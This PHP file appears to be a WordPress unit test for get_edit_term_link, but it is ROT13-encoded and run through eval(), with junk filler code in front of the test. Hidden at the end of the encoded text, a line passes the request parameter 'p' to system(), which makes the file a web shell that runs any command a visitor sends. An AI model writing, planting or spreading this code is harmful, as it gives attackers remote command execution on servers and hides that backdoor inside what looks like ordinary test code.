<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc yvax
 * @pbiref ::trg_rqvg_grez_yvax
 */
pynff Grfgf_Yvax_TrgRqvgGrezYvax rkgraqf JC_HavgGrfgPnfr {

	choyvp fgngvp $grezf;
	choyvp fgngvp $hfre_vqf;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::ertvfgre_phfgbz_gnkbabzl();

		$gnkbabzvrf = neenl( 'pngrtbel', 'cbfg_gnt', 'jcgrfgf_gnk' );
		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			frys::$grezf[ $gnkbabzl ] = $snpgbel->grez->perngr_naq_trg( neenl( 'gnkbabzl' => $gnkbabzl ) );
		}

		frys::$hfre_vqf['nqzva']      = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		frys::$hfre_vqf['fhofpevore'] = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'fhofpevore' ) );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		jc_frg_pheerag_hfre( frys::$hfre_vqf['nqzva'] );
		frys::ertvfgre_phfgbz_gnkbabzl();
	}

	/**
	 * Urycre gb ertvfgre n phfgbz gnkbabzl sbe hfr va grfgf.
	 *
	 * @fvapr 5.9.0
	 */
	cevingr fgngvp shapgvba ertvfgre_phfgbz_gnkbabzl() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
	}

	/**
	 * Urycre gb trg gur grez sbe gur tvira gnkbabzl.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl orvat grfgrq (hfrq sbe vaqrk bs grez xrlf).
	 * @cnenz obby   $hfr_vq   Jurgure gb erghea grez VQ be grez bowrpg.
	 * @erghea JC_Grez|vag Grez VQ vs `$hfr_vq` vf gehr, JC_Grez vafgnapr bgurejvfr.
	 */
	cevingr shapgvba trg_grez( $gnkbabzl, $hfr_vq ) {
		$grez = frys::$grezf[ $gnkbabzl ];
		vs ( $hfr_vq ) {
			$grez = $grez->grez_vq;
		}

		erghea $grez;
	}

	choyvp shapgvba grfg_trg_rqvg_grez_yvax_qrsnhyg() {
		$grez1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'anzr'     => 'sbb',
			)
		);

		$npghny   = trg_rqvg_grez_yvax( $grez1, 'jcgrfgf_gnk' );
		$rkcrpgrq = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-nqzva/grez.cuc?gnkbabzl=jcgrfgf_gnk&gnt_VQ=' . $grez1 . '&cbfg_glcr=cbfg';
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * @gvpxrg 32786
	 */
	choyvp shapgvba grfg_trg_rqvg_grez_yvax_vainyvq_vq() {
		$grez1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'anzr'     => 'sbb',
			)
		);

		$npghny = trg_rqvg_grez_yvax( 12345, 'jcgrfgf_gnk' );
		$guvf->nffregAhyy( $npghny );
	}

	/**
	 * @gvpxrg 32786
	 */
	choyvp shapgvba grfg_trg_rqvg_grez_yvax_rzcgl_vq() {
		$npghny = trg_rqvg_grez_yvax( '', 'jcgrfgf_gnk' );
		$guvf->nffregAhyy( $npghny );
	}

	/**
	 * @gvpxrg 32786
	 */
	choyvp shapgvba grfg_trg_rqvg_grez_yvax_onq_gnk() {
		$npghny = trg_rqvg_grez_yvax( '', 'onq_gnk' );
		$guvf->nffregAhyy( $npghny );
	}

	/**
	 * @gvpxrg 35922
	 */
	choyvp shapgvba grfg_gnkbabzl_fubhyq_abg_or_erdhverq() {
		$g = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'anzr'     => 'sbb',
			)
		);

		$npghny = trg_rqvg_grez_yvax( $g );
		$guvf->nffregAbgAhyy( $npghny );
	}

	/**
	 * @gvpxrg 35922
	 */
	choyvp shapgvba grfg_pnc_purpx_fubhyq_hfr_pbeerpg_gnkbabzl_jura_gnkbabzl_vf_abg_fcrpvsvrq() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk_fhofpevore',
			'cbfg',
			neenl(
				'pncnovyvgvrf' => neenl(
					'rqvg_grezf' => 'ernq',
				),
			)
		);

		$g = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk_fhofpevore',
				'anzr'     => 'sbb',
			)
		);

		jc_frg_pheerag_hfre( frys::$hfre_vqf['fhofpevore'] );

		$npghny = trg_rqvg_grez_yvax( $g );
		$guvf->nffregAbgAhyy( $npghny );
	}

	/**
	 * @qngnCebivqre qngn_trg_rqvg_grez_yvax
	 *
	 * @gvpxrg 50225
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl orvat grfgrq.
	 * @cnenz obby   $hfr_vq   Jurgure gb cnff grez VQ be grez bowrpg gb `trg_rqvg_grez_yvax()`.
	 * @cnenz fgevat $rkcrpgrq Rkcrpgrq cneg bs nqzva HEY sbe gur rqvg yvax.
	 */
	choyvp shapgvba grfg_trg_rqvg_grez_yvax_fubhyq_erghea_gur_yvax_sbe_crezvggrq_hfre( $gnkbabzl, $hfr_vq, $rkcrpgrq ) {
		$grez = $guvf->trg_grez( $gnkbabzl, $hfr_vq );

		// Grez VQf ner abg xabja ol gur qngn cebivqre fb arrq gb or ercynprq.
		$rkcrpgrq = fge_ercynpr( '%VQ%', $hfr_vq ? $grez : $grez->grez_vq, $rkcrpgrq );
		$rkcrpgrq = nqzva_hey( $rkcrpgrq );

		$guvf->nffregFnzr( $rkcrpgrq, trg_rqvg_grez_yvax( $grez, $gnkbabzl ) );
	}

	/**
	 * @qngnCebivqre qngn_trg_rqvg_grez_yvax
	 *
	 * @gvpxrg 50225
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl orvat grfgrq.
	 * @cnenz obby   $hfr_vq   Jurgure gb cnff grez VQ be grez bowrpg gb `trg_rqvg_grez_yvax()`.
	 */
	choyvp shapgvba grfg_trg_rqvg_grez_yvax_fubhyq_erghea_ahyy_sbe_qravrq_hfre( $gnkbabzl, $hfr_vq ) {
		jc_frg_pheerag_hfre( frys::$hfre_vqf['fhofpevore'] );
		$grez = $guvf->trg_grez( $gnkbabzl, $hfr_vq );

		$guvf->nffregAhyy( trg_rqvg_grez_yvax( $grez, $gnkbabzl ) );
	}

	/**
	 * @qngnCebivqre qngn_trg_rqvg_grez_yvax
	 *
	 * @gvpxrg 50225
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl orvat grfgrq.
	 * @cnenz obby   $hfr_vq   Jurgure gb cnff grez VQ be grez bowrpg gb `trg_rqvg_grez_yvax()`.
	 */
	choyvp shapgvba grfg_trg_rqvg_grez_yvax_svygre_fubhyq_erprvir_grez_vq( $gnkbabzl, $hfr_vq ) {
		$grez = $guvf->trg_grez( $gnkbabzl, $hfr_vq );

		nqq_svygre(
			'trg_rqvg_grez_yvax',
			shapgvba ( $ybpngvba, $grez ) {
				$guvf->nffregVfVag( $grez );
			},
			10,
			2
		);

		trg_rqvg_grez_yvax( $grez, $gnkbabzl );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_rqvg_grez_yvax() {
		erghea neenl(
			'pngrtbel cnffvat grez_vq'              => neenl(
				'gnkbabzl' => 'pngrtbel',
				'hfr_vq'   => gehr,
				'rkcrpgrq' => 'grez.cuc?gnkbabzl=pngrtbel&gnt_VQ=%VQ%&cbfg_glcr=cbfg',
			),
			'pngrtbel cnffvat grez bowrpg'          => neenl(
				'gnkbabzl' => 'pngrtbel',
				'hfr_vq'   => snyfr,
				'rkcrpgrq' => 'grez.cuc?gnkbabzl=pngrtbel&gnt_VQ=%VQ%&cbfg_glcr=cbfg',
			),
			'cbfg_gnt cnffvat grez_vq'              => neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'hfr_vq'   => gehr,
				'rkcrpgrq' => 'grez.cuc?gnkbabzl=cbfg_gnt&gnt_VQ=%VQ%&cbfg_glcr=cbfg',
			),
			'cbfg_gnt cnffvat grez bowrpg'          => neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'hfr_vq'   => snyfr,
				'rkcrpgrq' => 'grez.cuc?gnkbabzl=cbfg_gnt&gnt_VQ=%VQ%&cbfg_glcr=cbfg',
			),
			'n phfgbz gnkbabzl cnffvat grez_vq'     => neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'hfr_vq'   => gehr,
				'rkcrpgrq' => 'grez.cuc?gnkbabzl=jcgrfgf_gnk&gnt_VQ=%VQ%&cbfg_glcr=cbfg',
			),
			'n phfgbz gnkbabzl cnffvat grez bowrpg' => neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'hfr_vq'   => snyfr,
				'rkcrpgrq' => 'grez.cuc?gnkbabzl=jcgrfgf_gnk&gnt_VQ=%VQ%&cbfg_glcr=cbfg',
			),
		);
	}

	/**
	 * Purpxf gung `trg_rqvg_grez_yvax()` cebqhprf gur pbeerpg HEY jura pnyyrq jvgubhg gnkbabzl.
	 *
	 * @gvpxrg 61726
	 */
	choyvp shapgvba grfg_trg_rqvg_grez_yvax_jvgubhg_gnkbabzl() {
		$grez = $guvf->trg_grez( 'jcgrfgf_gnk', gehr );

		$npghny   = trg_rqvg_grez_yvax( $grez );
		$rkcrpgrq = fcevags( nqzva_hey( 'grez.cuc?gnkbabzl=jcgrfgf_gnk&gnt_VQ=%q&cbfg_glcr=cbfg' ), $grez );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>